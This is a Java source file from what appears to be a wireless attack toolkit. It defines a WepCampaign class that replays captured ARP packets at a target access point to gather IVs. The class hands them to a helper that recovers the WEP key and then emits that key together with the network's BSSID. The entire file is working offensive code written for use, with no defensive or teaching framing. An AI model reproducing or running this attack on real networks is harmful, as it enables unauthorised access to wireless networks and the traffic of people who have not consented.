package com.opx.oss.engine.attacks;

import com.opx.oss.engine.WepBook;
import com.opx.oss.engine.chips.WifiChip;

import org.json.JSONObject;

import java.util.List;
import java.util.Locale;

/**
 * WEP: replay captured ARP packets so the AP answers with a fresh IV each time, and hand every
 * protected frame to the book as it arrives. The key falls out once enough IVs have collected.
 */
public final class WepCampaign extends Campaign {

    private final WepBook book;
    private final int rounds;
    private final long gapMillis;

    public WepCampaign(WifiChip chip, String bssid, JSONObject options, WepBook book) {
        super(chip, bssid, options);
        this.book = book;
        this.rounds = Math.max(1, options.optInt("rounds", 2000));
        this.gapMillis = Math.max(1, options.optLong("gap", 12));
    }

    @Override
    public String kind() {
        return "wep";
    }

    @Override
    protected void run(Events events) throws Exception {
        log(events, "replaying ARP packets to collect IVs");
        for (int round = 1; round <= rounds && !shouldStop(); round++) {
            List<byte[]> samples = book.samples();
            if (samples.isEmpty()) {
                log(events, "no protected ARP packet seen yet; wait for traffic on the network");
                sleep(1000);
                continue;
            }
            for (byte[] frame : samples) {
                if (shouldStop()) return;
                chip.transmit(frame);
                sleep(gapMillis);
            }

            int ivs = book.ivCount();
            progress(events, Math.min(99, (round * 100) / rounds), ivs + " IVs");
            if (ivs >= 1000 && ivs % 1000 < samples.size()) {
                byte[] key = book.key();
                if (key != null) {
                    String hex = hex(key);
                    log(events, "key recovered: " + hex);
                    progress(events, 100, "key recovered");
                    JSONObject found = event("wep_key");
                    try {
                        found.put("bssid", bssid).put("key", hex).put("ivs", ivs);
                    } catch (Exception ignored) {
                        // Plain types only.
                    }
                    events.emit(found);
                    return;
                }
            }
        }
        log(events, book.ivCount() + " IVs collected; the key is not decided yet");
    }

    private static String hex(byte[] data) {
        StringBuilder text = new StringBuilder(data.length * 2);
        for (byte value : data) text.append(String.format(Locale.US, "%02x", value & 0xFF));
        return text.toString();
    }
}
